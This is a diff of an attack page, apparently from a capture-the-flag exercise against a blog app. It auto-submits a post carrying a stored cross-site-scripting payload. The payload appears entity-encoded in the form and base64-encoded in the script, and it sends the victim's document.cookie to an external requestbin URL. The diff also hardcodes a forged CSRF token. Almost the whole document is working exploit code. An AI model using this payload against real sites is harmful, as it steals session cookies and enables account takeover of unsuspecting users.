@@ -17,11 +17,10 @@
   <h5>Add a Post</h5>
   <div class="form-group">
     <label>Content</label>
-      <textarea class="form-control" id="content" name="content">Too hard for my small brain to learn Falcon...</textarea>
+      <textarea class="form-control" id="content" name="content">&#x3C;script&#x3E;fetch(&#x27;https://requestbin.net/r/8g9looxh?q=&#x27;+document.cookie, { mode: &#x27;no-cors&#x27; })&#x3C;/script&#x3E;</textarea>
   </div>
-    <input hidden name="csrf_token" id="csrf_token" value="None">
-  <input type="submit" hidden id="send" />
-  <button class="btn btn-primary" onclick="create_post()">Send</button>
+    <input hidden name="csrf_token" id="csrf_token" value="94cffcad327e90489b8f8a0f02cc6bda">
+  <input type="submit"/>
 </form>
 </body>
 
@@ -35,11 +34,16 @@
 <script>
     async function create_post(){
         document.getElementById("content").value = atob("PHNjcmlwdD5mZXRjaCgnaHR0cHM6Ly9yZXF1ZXN0YmluLm5ldC9yLzhnOWxvb3hoP3E9Jytkb2N1bWVudC5jb29raWUsIHsgbW9kZTogJ25vLWNvcnMnIH0pPC9zY3JpcHQ+");
+		/*
         let content = encodeURIComponent(document.getElementById("content").value);
         let content_hash = CryptoJS.MD5(content).toString();
-        await fetch(`https://blog-force.herokuapp.com/claim_csrf_token?token=${content_hash}`, { mode: 'no-cors' });
+        await fetch(`https://blog-force.herokuapp.com/claim_csrf_token?token=${content_hash}`, 
+			{ 
+				mode: 'no-cors'
+			});
         document.getElementById("csrf_token").value = content_hash;
-        document.getElementById("send").click();
+		console.log(content_hash);
+        //document.getElementById("form").submit();*/
     }
 
     create_post();
